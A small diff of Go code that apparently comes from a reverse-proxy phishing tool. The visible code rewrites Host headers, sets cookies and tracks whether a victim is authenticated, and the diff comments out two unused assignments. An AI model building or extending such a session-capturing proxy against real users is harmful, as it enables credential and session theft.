@@ -471,7 +471,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 // 					hg[n] = b ^ 0xCC
 // 				}
 				// replace "Host" header
-				e_host := req.Host
+				//e_host := req.Host
 				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
 					req.Host = r_host
 				}
@@ -877,7 +877,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if ds.String() != "" {
 				resp.Header.Add("Set-Cookie", ds.String())
 			}
-			res, _ := resp.Request.Cookie(ds.Name)
+			//res, _ := resp.Request.Cookie(ds.Name)
 			//json.Unmarshal([]byte(res), &res)
 			//log.Warning("COOKIES RESPONSE BAWAH", res)
 			if is_auth {
